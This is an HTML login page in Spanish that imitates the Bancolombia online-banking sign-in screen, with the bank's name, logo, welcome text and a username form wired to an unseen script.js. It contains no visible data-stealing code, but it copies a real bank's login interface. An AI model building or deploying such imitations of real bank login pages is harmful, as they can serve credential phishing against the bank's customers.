<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Bancolombia</title>
    <link rel="stylesheet" href="styles.css"> <!-- Enlace al CSS -->
    <script defer src="script.js"></script> <!-- Archivo de JavaScript -->
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="logo.png" alt="Bancolombia">
        </div>
        <a href="#" class="salir">Salir →</a>
    </header>

    <main>
        <div class="login-container">
            <h2 class="bienvenida">Te damos la bienvenida</h2> <!-- Bienvenida fuera del formulario -->
            <div class="login-box">
                <p>El usuario es el mismo con el que ingresas a la <strong>Sucursal Virtual Personas.</strong></p>
                <form id="loginForm">
                    <label for="usuario">
                        <input type="text" id="usuario" placeholder="Usuario" required>
                    </label>
                    <a href="#" class="olvide">¿Olvidaste tu usuario?</a>
                    <div class="botones">
                        <button type="button" class="volver">Volver</button>
                        <button type="submit" class="continuar">Continuar</button>
                    </div>
                </form>
            </div>
        </div>
    </main>
</body>
</html>
